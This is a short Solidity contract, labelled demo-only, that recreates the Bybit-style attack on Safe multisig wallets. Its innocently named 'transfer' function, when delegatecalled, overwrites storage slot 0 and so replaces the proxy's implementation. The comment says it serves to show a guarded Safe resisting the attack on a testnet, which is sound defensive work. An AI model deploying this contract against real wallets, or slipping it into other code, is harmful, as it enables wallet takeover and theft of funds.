// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

/// @notice DEMO ONLY. Reproduces the mechanism of the February 2025 Bybit attack contract:
///         a function named like a harmless transfer that, when DELEGATECALLed by a Safe,
///         writes its first argument into storage slot 0, the Safe proxy's implementation.
///         Used on Base Sepolia to show a guarded Safe surviving it and an unguarded one not.
contract BybitShape {
    function transfer(address to, uint256) external {
        assembly {
            sstore(0, to)
        }
    }
}
